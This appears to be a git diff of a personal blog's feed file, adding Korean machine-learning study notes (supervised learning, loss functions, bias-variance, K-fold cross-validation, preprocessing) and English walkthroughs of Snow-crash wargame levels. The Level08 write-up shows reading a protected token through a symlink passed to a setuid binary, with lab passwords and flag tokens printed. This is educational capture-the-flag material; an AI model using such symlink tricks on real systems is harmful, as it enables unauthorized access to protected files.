+  <li><strong>회귀</strong>: 집값 예측, 온도 예측, 매출 예측</li>
+</ul>
+
+<h3 id="비지도학습-unsupervised-learning">비지도학습 (Unsupervised Learning)</h3>
+
+<p><strong>정답 없이 데이터 자체의 패턴이나 구조</strong>를 발견하도록 학습시키는 방법</p>
+
+<p><strong>주요 특징:</strong></p>
+<ul>
+  <li>레이블이 없는 데이터만 사용</li>
+  <li>데이터의 숨겨진 패턴을 발견</li>
+  <li>결과 해석이 주관적일 수 있음</li>
+</ul>
+
+<p><strong>예시:</strong></p>
+<ul>
+  <li><strong>클러스터링</strong>: 고객 분류, 문서 그룹화</li>
+  <li><strong>차원 축소</strong>: 데이터 시각화, 특성 추출</li>
+  <li><strong>연관 규칙 학습</strong>: 장바구니 분석, 추천 시스템</li>
+</ul>
+
+<h3 id="비교표">비교표</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>구분</th>
+      <th>지도학습</th>
+      <th>비지도학습</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>데이터</strong></td>
+      <td>레이블링된 데이터</td>
+      <td>레이블 없는 데이터</td>
+    </tr>
+    <tr>
+      <td><strong>목표</strong></td>
+      <td>정답 예측</td>
+      <td>패턴 발견</td>
+    </tr>
+    <tr>
+      <td><strong>평가</strong></td>
+      <td>정확도, 정밀도 등</td>
+      <td>주관적 해석</td>
+    </tr>
+    <tr>
+      <td><strong>응용</strong></td>
+      <td>분류, 회귀</td>
+      <td>클러스터링, 차원 축소</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="손실-함수-loss-function">손실 함수 (Loss Function)</h2>
+
+<h3 id="손실-함수란">손실 함수란?</h3>
+
+<p><strong>머신러닝이나 딥러닝 모델이 예측한 값과 실제 값 사이의 차이를 측정하는 함수</strong></p>
+
+<h3 id="손실-함수의-역할">손실 함수의 역할</h3>
+
+<ol>
+  <li><strong>성능 평가</strong>: 모델의 예측 성능을 수치적으로 측정</li>
+  <li><strong>개선 방향 제시</strong>: 어떤 방향으로 개선되어야 할지 알려줌</li>
+  <li><strong>학습 가이드라인</strong>: 모델 학습의 목표 제공</li>
+</ol>
+
+<h3 id="중요성">중요성</h3>
+
+<ul>
+  <li><strong>모델 학습의 핵심</strong>: 손실 함수 없이는 모델이 자신의 성능을 개선해 나가는 것이 불가능</li>
+  <li><strong>최적화 기준</strong>: 손실 함수의 값을 최소화하는 것이 모델 학습의 목표</li>
+  <li><strong>방향성 제공</strong>: 최적화 과정에서 모델이 올바른 방향으로 나아갈 수 있도록 도움</li>
+</ul>
+
+<h3 id="주요-손실-함수">주요 손실 함수</h3>
+
+<h4 id="회귀-문제">회귀 문제</h4>
+<ul>
+  <li><strong>MSE (Mean Squared Error)</strong>: 평균 제곱 오차</li>
+  <li><strong>MAE (Mean Absolute Error)</strong>: 평균 절대 오차</li>
+</ul>
+
+<h4 id="분류-문제">분류 문제</h4>
+<ul>
+  <li><strong>Cross Entropy</strong>: 교차 엔트로피</li>
+  <li><strong>Binary Cross Entropy</strong>: 이진 교차 엔트로피</li>
+</ul>
+
+<hr />
+
+<h2 id="편향과-분산-bias-and-variance">편향과 분산 (Bias and Variance)</h2>
+
+<h3 id="편향-bias">편향 (Bias)</h3>
+
+<p><strong>추정 결과가 한 쪽으로 치우치는 경향을 보임으로써 발생하는 오차</strong></p>
+
+<ul>
+  <li>모델에서 예측한 결과가 정답과 일정하게 차이가 나는 정도</li>
+  <li><strong>높은 편향</strong>: 모델이 단순하여 복잡한 패턴을 학습하지 못함 (과소적합)</li>
+  <li><strong>낮은 편향</strong>: 모델이 복잡한 패턴을 학습할 수 있음</li>
+</ul>
+
+<h3 id="분산-variance">분산 (Variance)</h3>
+
+<p><strong>변량(데이터)들이 퍼져있는 정도</strong></p>
+
+<ul>
+  <li>모델에서는 주어진 데이터 포인트에 대한 모델 예측의 가변성</li>
+  <li><strong>높은 분산</strong>: 모델이 훈련 데이터에 과도하게 맞춰짐 (과적합)</li>
+  <li><strong>낮은 분산</strong>: 모델이 일관된 예측을 수행</li>
+</ul>
+
+<h3 id="편향-분산-트레이드오프-bias-variance-trade-off">편향-분산 트레이드오프 (Bias-Variance Trade-off)</h3>
+
+<p><strong>편향과 분산은 상충관계</strong>를 갖습니다:</p>
+
+<ul>
+  <li>서로 상반되는 특성을 가지고 있어, 한쪽을 줄이려고 하면 다른 쪽이 증가하는 경향</li>
+  <li>모델을 학습할 때는 <strong>편향과 분산의 균형</strong>을 잘 맞춰야 함</li>
+</ul>
+
+<h3 id="모델-특성별-분석">모델 특성별 분석</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>편향</th>
+      <th>분산</th>
+      <th>모델 특성</th>
+      <th>문제점</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>높음</strong></td>
+      <td>낮음</td>
+      <td>단순한 모델</td>
+      <td>예측력이 낮음 (과소적합)</td>
+    </tr>
+    <tr>
+      <td>낮음</td>
+      <td><strong>높음</strong></td>
+      <td>복잡한 모델</td>
+      <td>과대적합 위험</td>
+    </tr>
+    <tr>
+      <td><strong>낮음</strong></td>
+      <td><strong>낮음</strong></td>
+      <td>이상적인 모델</td>
+      <td>학습 데이터와 새로운 데이터 모두에서 좋은 성능</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="k-폴드-교차-검증-k-fold-cross-validation">K-폴드 교차 검증 (K-Fold Cross Validation)</h2>
+
+<h3 id="k-폴드-교차-검증이란">K-폴드 교차 검증이란?</h3>
+
+<p><strong>편향된 모델을 해결하기 위해 교차검증의 방법을 이용하여 다양한 학습과 평가를 수행하는 가장 보편적으로 사용되는 교차 검증 기법</strong></p>
+
+<h3 id="목적">목적</h3>
+<ul>
+  <li>제한된 데이터 샘플에서 머신러닝 모델을 평가</li>
+  <li>데이터의 특정한 분할에 의한 편향을 줄임</li>
+  <li>모델의 일반화 성능을 더 정확하게 평가</li>
+</ul>
+
+<h3 id="방법">방법</h3>
+
+<ol>
+  <li><strong>데이터 분할</strong>: 주어진 데이터를 K개의 폴드로 나눔</li>
+  <li><strong>반복 학습</strong>: 각 폴드를 한 번씩 검증 세트로 사용하고 나머지를 학습 세트로 활용</li>
+  <li><strong>성능 평가</strong>: K번의 학습 결과를 평균하여 최종 성능 평가</li>
+</ol>
+
+<h3 id="k-값-선택-시-고려사항">K 값 선택 시 고려사항</h3>
+
+<h4 id="1-계산-시간">1. 계산 시간</h4>
+<ul>
+  <li><strong>K가 클수록</strong>: 계산 시간이 오래 걸림 (예: K=10)</li>
+  <li><strong>K가 작을수록</strong>: 시간이 덜 걸림 (예: K=3)</li>
+</ul>
+
+<h4 id="2-정확도와-안정성">2. 정확도와 안정성</h4>
+<ul>
+  <li><strong>K가 클수록</strong>:
+    <ul>
+      <li>결과가 더 정확함</li>
+      <li>결과들이 들쭉날쭉 불안정할 수 있음</li>
+    </ul>
+  </li>
+  <li><strong>K가 작을수록</strong>:
+    <ul>
+      <li>결과가 덜 정확할 수 있음</li>
+      <li>비교적 안정적</li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="3-데이터-양">3. 데이터 양</h4>
+<ul>
+  <li><strong>데이터가 적으면</strong>: K를 크게 해서 데이터를 최대한 활용</li>
+  <li><strong>데이터가 많으면</strong>: K를 작게 해도 충분</li>
+  <li><strong>일반적 권장</strong>: K=5 또는 K=10</li>
+</ul>
+
+<h3 id="k-폴드-교차-검증의-장점">K-폴드 교차 검증의 장점</h3>
+
+<ul>
+  <li><strong>편향 감소</strong>: 다양한 데이터 분할로 인한 편향 최소화</li>
+  <li><strong>신뢰성 향상</strong>: 더 안정적인 모델 성능 평가</li>
+  <li><strong>데이터 효율성</strong>: 제한된 데이터를 최대한 활용</li>
+</ul>
+
+<hr />
+
+<hr />]]></content><author><name>Yoo</name></author><category term="sprint" /><category term="python" /><category term="AI engineering" /><category term="machine learning" /><category term="supervised learning" /><category term="unsupervised learning" /><category term="loss function" /><category term="cross validation" /><summary type="html"><![CDATA[지도학습과 비지도학습, 손실 함수, 편향-분산 트레이드오프, K-폴드 교차 검증에 대한 심화 학습]]></summary></entry><entry><title type="html">위클리 페이퍼 1</title><link href="/sprint/WeeklyPaper/" rel="alternate" type="text/html" title="위클리 페이퍼 1" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>/sprint/WeeklyPaper</id><content type="html" xml:base="/sprint/WeeklyPaper/"><![CDATA[<p><span style="font-size: 10px; color: gris"></span></p>
+
+<h3 id="선형대수학이란-어떤-학문이며-왜-머신러닝에-필요할까"><em>선형대수학이란 어떤 학문이며, 왜 머신러닝에 필요할까?</em></h3>
+<p><br /></p>
+
+<h4 id="선형대수학-이란"><strong>선형대수학 이란?</strong></h4>
+
+<p><code class="language-plaintext highlighter-rouge">선형대수학은 벡터, 행렬, 선형 변환 등을 연구하는 수학의 한 분야. 데이터를 효율적으로 표현하고, 그 데이터들 사이의 선형적인 관계를 분석하며, 다양한 변환을 통해 데이터를 조작하는 방법을 다룸.</code></p>
+
+<h4 id="머신러닝에서-선형대수학이-필요한-주된-이유"><strong>머신러닝에서 선형대수학이 필요한 주된 이유?</strong></h4>
+
+<ol>
+  <li>데이터 표현: 머신러닝에서 다루는 이미지, 텍스트, 수치 데이터 등 모든 데이터는 벡터나 행렬의 형태로 표현됨. 선형대수학은 이러한 데이터 구조를 이해하고 다루는 데 필수적인 기반을 제공함.
+<br /></li>
+  <li>알고리즘의 핵심: 선형 회귀, 주성분 분석(PCA), 신경망(딥러닝) 등 대부분의 머신러닝 알고리즘은 내부적으로 행렬 곱셈, 역행렬, 고유값 분해 등 선형대수학 연산을 사용함.
+<br /></li>
+  <li>효율적인 계산: 방대한 양의 데이터를 처리하고 복잡한 모델을 학습시키는 과정에서 선형대수학의 행렬 연산은 계산 효율성을 극대화하고 병렬 처리를 가능하게 함.
+<br /></li>
+  <li>개념적 이해: 선형대수학을 이해하면 머신러닝 알고리즘이 ‘왜’ 그렇게 작동하는지, 어떤 수학적 원리를 따르는지 깊이 있게 파악할 수 있어, 모델을 개선하고 새로운 아이디어를 적용하는 데 큰 도움이 됨.
+<br /></li>
+</ol>
+
+<h3 id="edaexploratory-data-analysis란"><em>EDA(Exploratory Data Analysis)란?</em></h3>
+
+<p><code class="language-plaintext highlighter-rouge">EDA(Exploratory Data Analysis), 즉 탐색적 데이터 분석은 데이터를 본격적으로 분석하거나 모델링하기 전에, 데이터를 다양한 각도에서 살펴보고 그 특성을 이해하며 숨겨진 패턴, 이상치, 관계 등을 발견하는 과정임. 이는 주로 시각화 기법(그래프, 차트 등)과 요약 통계(평균, 중앙값, 분산 등)를 활용하여 이루어짐.</code></p>
+
+<ol>
+  <li>
+    <p>데이터 이해: 데이터셋이 어떤 변수들을 가지고 있고, 각 변수의 분포는 어떠하며, 어떤 타입의 데이터인지 전반적으로 파악함.
+<br /></p>
+  </li>
+  <li>문제점 발견: 데이터에 있을 수 있는 결측치(누락된 값), 이상치(비정상적인 값), 오류 등을 식별. 이러한 문제점들은 모델의 성능에 큰 영향을 미치기 때문에 미리 파악하고 적절히 처리하는 것이 중요.
+<br /></li>
+  <li>패턴 및 관계 발견: 수많은 데이터 포인트들 사이에서 서로 어떤 영향을 주고받는지, 시간이 흐름에 따라 어떤 변화를 보이는지, 또는 특정 조건에서 어떤 그룹들이 독특한 특징을 가지는지 등을 파헤쳐서 의미 있는 사실을 알아내는 것.
+<br /></li>
+  <li>가설 설정: 데이터를 탐색하면서 얻은 직관을 바탕으로 추가적인 분석이나 모델링을 위한 가설을 세움.
+<br /></li>
+  <li>적절한 분석 기법 선택
+<br /><br /></li>
+</ol>
+
+<h3 id="대표적인-데이터-전처리-방법--결측값-중복값-이상치-처리"><em>대표적인 데이터 전처리 방법 : 결측값, 중복값, 이상치 처리</em></h3>
+
+<p><code class="language-plaintext highlighter-rouge">데이터 전처리는 원본 데이터를 머신러닝 모델이 학습하기에 적합한 형태로 가공하는 과정입니다. 이 과정은 모델의 성능에 지대한 영향을 미치므로 매우 중요하며, 좋은 분석 결과와 모델 성능을 얻기 위한 필수적인 과정임.</code></p>
+
+<p><strong>1. 결측값 처리</strong>
+<code class="language-plaintext highlighter-rouge">결측값은 데이터셋 내에 값이 비어 있거나 누락된 부분을 의미합니다.(예: NaN, Null, None, 빈 칸 등)</code></p>
+
+<ul>
+  <li>
+    <p>삭제: 비어있는 행이나 열을 통째로 없애버리는 방법</p>
+  </li>
+  <li>
+    <p>대체: 비어있는 칸을 적절한 값으로 채워 넣는 방법. 평균, 중앙값, 가장 많이 나오는 값 등으로 채우거나, 다른 정보를 이용해서 예측해서 채우기도 함.</p>
+  </li>
+</ul>
+
+<p><strong>2. 중복값 처리</strong>
+<code class="language-plaintext highlighter-rouge">같은 정보가 두 번, 세 번 똑같이 반복되는 것</code></p>
+<ul>
+  <li>제거: 똑같은 정보가 여러 개 있다면, 하나만 남기고 나머지는 다 지워야함. 그래야 분석이 정확해지고 모델이 엉뚱하게 학습하지 않음.</li>
+</ul>
+
+<p><strong>3. 이상치 처리</strong>
+<code class="language-plaintext highlighter-rouge">이상치는 대부분의 데이터와는 크게 동떨어져 있는 값으로, 다른 데이터 패턴으로부터 벗어난 값. 이상치는 데이터 입력 오류, 측정 오류 또는 실제 데이터의 이례적인 현상일 수 있음. 이상치는 통계 분석 결과나 머신러닝 모델의 성능에 큰 영향을 미칠 수 있음.</code></p>
+
+<ul>
+  <li>삭제: 삭제해도 전체 데이터의 흐름에 큰 영향을 주지 않을 만큼 데이터의 양이 충분할 때 사용</li>
+  <li>변환: 이상치 자체가 오류가 아니라 데이터의 분포가 매우 비대칭적일 때 사용 (로그 변환, 제곱근 변환 등)</li>
+  <li>대체: 이상치를 삭제하기 어렵거나, 이상치 자체가 특정 정보를 담고 있을 수 있지만 모델 학습에 방해가 될 때 사용(평균,중앙값,최빈값 대체)</li>
+  <li>분석 유지: 이상치가 단순한 오류가 아니라 실제로 중요한 의미를 가지는 경우, 따로 분석하여 그 원인과 특성을 깊이 파악</li>
+</ul>]]></content><author><name>Yoo</name></author><category term="sprint" /><category term="python" /><category term="AI engineering" /><category term="Github" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">일상</title><link href="/blog/daily/" rel="alternate" type="text/html" title="일상" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>/blog/daily</id><content type="html" xml:base="/blog/daily/"><![CDATA[<p>이건 테스트용</p>]]></content><author><name>Yoo</name></author><category term="blog" /><category term="python" /><category term="AI engineering" /><category term="Github" /><summary type="html"><![CDATA[이건 테스트용]]></summary></entry><entry><title type="html">[Snow-crash] Level08</title><link href="/ecole42/Level08/" rel="alternate" type="text/html" title="[Snow-crash] Level08" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>/ecole42/Level08</id><content type="html" xml:base="/ecole42/Level08/"><![CDATA[<h4 id="1-the-password-of-level08-is-the-token-that-got-from-level07">1. The password of <code class="language-plaintext highlighter-rouge">Level08</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level07</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
+</code></pre></div></div>
+
+<h4 id="2-so-try-login-to-level08-with-the-password-we-got-from-level07-and-try-to-put-the-command-ls-we-can-see-the-files-level08-and-token-and-try-to-cat-and-execute">2. So, try login to Level08 with the password we got from Level07 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the files <code class="language-plaintext highlighter-rouge">Level08</code> and <code class="language-plaintext highlighter-rouge">token</code>. and try to <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">execute</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>su level08
+Password:
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span>  1 level08 level08  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span>  1 level08 level08 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span>  1 level08 level08  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-s---</span>+ 1 flag08  level08 8617 Mar  5  2016 level08
+<span class="nt">-rw-------</span>  1 flag08  flag08    26 Mar  5  2016 token
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>token
+<span class="nb">cat</span>: token: Permission denied
+level08@SnowCrash:~<span class="nv">$ </span>./level08
+./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
+</code></pre></div></div>
+
+<p>We can see <code class="language-plaintext highlighter-rouge">cat: token: Permission denied</code> and <code class="language-plaintext highlighter-rouge">execute: ./level08 [file to read]</code>.</p>
+
+<h4 id="3--then-try-to-ltrace">3 . then, try to ltrace</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>ltrace ./level08
+__libc_start_main<span class="o">(</span>0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 &lt;unfinished ...&gt;
+<span class="nb">printf</span><span class="o">(</span><span class="s2">"%s [file to read]</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"./level08"</span>./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
+<span class="o">)</span>        <span class="o">=</span> 25
+<span class="nb">exit</span><span class="o">(</span>1 &lt;unfinished ...&gt;
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>Same for the ltrace command, we need a another file to be read.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>./level08 token
+You may not access <span class="s1">'token'</span>
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">chmod</span> +x token
+<span class="nb">chmod</span>: changing permissions of <span class="sb">`</span>token<span class="s1">': Operation not permitted
+</span></code></pre></div></div>
+
+<h4 id="4-so-since-we-dont-have-any-access-lets-create-the-symbolic-link-as-we-did-in-previous-exercises">4. So, since we don’t have any access, let’s create the <code class="language-plaintext highlighter-rouge">symbolic link</code> as we did in previous exercises.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span><span class="nb">pwd</span>
+/home/user/level08
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/user/level08/token /tmp/level08flag
+level08@SnowCrash:~<span class="nv">$ </span>./level08 /tmp/level08flag
+quif5eloekouj29ke0vouxean
+</code></pre></div></div>
+
+<h4 id="5-so-we-found-our-password-lets-put-our-password-into-flag08-for-level09">5. So, we found our password! Let’s put our password into flag08 for level09.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+</code></pre></div></div>
+
+<h4 id="6-we-got-a-toekn-for-level-09">6. We got a toekn for level 09.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">[Snow-crash] Level09</title><link href="/ecole42/Level09/" rel="alternate" type="text/html" title="[Snow-crash] Level09" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>/ecole42/Level09</id><content type="html" xml:base="/ecole42/Level09/"><![CDATA[<h4 id="1-the-password-of-level09-is-the-token-that-got-from-level08">1. The password of <code class="language-plaintext highlighter-rouge">Level09</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level08</code>.</h4>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
 </code></pre></div></div>
@@ -142,71 +1159,7 @@ Password:
 Don't forget to launch getflag !
 flag09@SnowCrash:~$ getflag
 Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level08</title><link href="http://localhost:4000/ecole42/Level08/" rel="alternate" type="text/html" title="Snow-crash Level08" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level08</id><content type="html" xml:base="http://localhost:4000/ecole42/Level08/"><![CDATA[<h4 id="1-the-password-of-level08-is-the-token-that-got-from-level07">1. The password of <code class="language-plaintext highlighter-rouge">Level08</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level07</code>.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
-</code></pre></div></div>
-
-<h4 id="2-so-try-login-to-level08-with-the-password-we-got-from-level07-and-try-to-put-the-command-ls-we-can-see-the-files-level08-and-token-and-try-to-cat-and-execute">2. So, try login to Level08 with the password we got from Level07 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the files <code class="language-plaintext highlighter-rouge">Level08</code> and <code class="language-plaintext highlighter-rouge">token</code>. and try to <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">execute</code>.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>su level08
-Password:
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 28
-dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 <span class="nb">.</span>
-d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
-<span class="nt">-r-x------</span>  1 level08 level08  220 Apr  3  2012 .bash_logout
-<span class="nt">-r-x------</span>  1 level08 level08 3518 Aug 30  2015 .bashrc
-<span class="nt">-r-x------</span>  1 level08 level08  675 Apr  3  2012 .profile
-<span class="nt">-rwsr-s---</span>+ 1 flag08  level08 8617 Mar  5  2016 level08
-<span class="nt">-rw-------</span>  1 flag08  flag08    26 Mar  5  2016 token
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>token
-<span class="nb">cat</span>: token: Permission denied
-level08@SnowCrash:~<span class="nv">$ </span>./level08
-./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
-</code></pre></div></div>
-
-<p>We can see <code class="language-plaintext highlighter-rouge">cat: token: Permission denied</code> and <code class="language-plaintext highlighter-rouge">execute: ./level08 [file to read]</code>.</p>
-
-<h4 id="3--then-try-to-ltrace">3 . then, try to ltrace</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>ltrace ./level08
-__libc_start_main<span class="o">(</span>0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 &lt;unfinished ...&gt;
-<span class="nb">printf</span><span class="o">(</span><span class="s2">"%s [file to read]</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"./level08"</span>./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
-<span class="o">)</span>        <span class="o">=</span> 25
-<span class="nb">exit</span><span class="o">(</span>1 &lt;unfinished ...&gt;
-+++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
-</code></pre></div></div>
-
-<p>Same for the ltrace command, we need a another file to be read.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>./level08 token
-You may not access <span class="s1">'token'</span>
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">chmod</span> +x token
-<span class="nb">chmod</span>: changing permissions of <span class="sb">`</span>token<span class="s1">': Operation not permitted
-</span></code></pre></div></div>
-
-<h4 id="4-so-since-we-dont-have-any-access-lets-create-the-symbolic-link-as-we-did-in-previous-exercises">4. So, since we don’t have any access, let’s create the <code class="language-plaintext highlighter-rouge">symbolic link</code> as we did in previous exercises.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span><span class="nb">pwd</span>
-/home/user/level08
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/user/level08/token /tmp/level08flag
-level08@SnowCrash:~<span class="nv">$ </span>./level08 /tmp/level08flag
-quif5eloekouj29ke0vouxean
-</code></pre></div></div>
-
-<h4 id="5-so-we-found-our-password-lets-put-our-password-into-flag08-for-level09">5. So, we found our password! Let’s put our password into flag08 for level09.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~$ su flag08
-Password:
-Don't forget to launch getflag !
-flag08@SnowCrash:~$ getflag
-Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-</code></pre></div></div>
-
-<h4 id="6-we-got-a-toekn-for-level-09">6. We got a toekn for level 09.</h4>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level07</title><link href="http://localhost:4000/ecole42/Level07/" rel="alternate" type="text/html" title="Snow-crash Level07" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level07</id><content type="html" xml:base="http://localhost:4000/ecole42/Level07/"><![CDATA[<h4 id="1-the-password-of-level07-is-the-token-that-got-from-level06">1. The password of <code class="language-plaintext highlighter-rouge">Level07</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level06</code>.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">[Snow-crash] Level07</title><link href="/ecole42/Level07/" rel="alternate" type="text/html" title="[Snow-crash] Level07" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>/ecole42/Level07</id><content type="html" xml:base="/ecole42/Level07/"><![CDATA[<h4 id="1-the-password-of-level07-is-the-token-that-got-from-level06">1. The password of <code class="language-plaintext highlighter-rouge">Level07</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level06</code>.</h4>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
 </code></pre></div></div>
@@ -282,7 +1235,7 @@ Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
 
 <h4 id="7-we-got-a-token-for-level-08">7. We got a token for level 08.</h4>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level06</title><link href="http://localhost:4000/ecole42/Level06/" rel="alternate" type="text/html" title="Snow-crash Level06" /><published>2024-02-14T00:00:00+09:00</published><updated>2024-02-14T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level06</id><content type="html" xml:base="http://localhost:4000/ecole42/Level06/"><![CDATA[<h4 id="1-the-password-of-level06-is-the-token-that-got-from-level05">1. The password of <code class="language-plaintext highlighter-rouge">Level06</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level05</code>.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">[Snow-crash] Level06</title><link href="/ecole42/Level06/" rel="alternate" type="text/html" title="[Snow-crash] Level06" /><published>2024-02-14T00:00:00+09:00</published><updated>2024-02-14T00:00:00+09:00</updated><id>/ecole42/Level06</id><content type="html" xml:base="/ecole42/Level06/"><![CDATA[<h4 id="1-the-password-of-level06-is-the-token-that-got-from-level05">1. The password of <code class="language-plaintext highlighter-rouge">Level06</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level05</code>.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>viuaaale9huek52boumoomioc
 </code></pre></div></div>
@@ -437,417 +1390,4 @@ Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 <p>####  7. We got a token for level07</p>
 
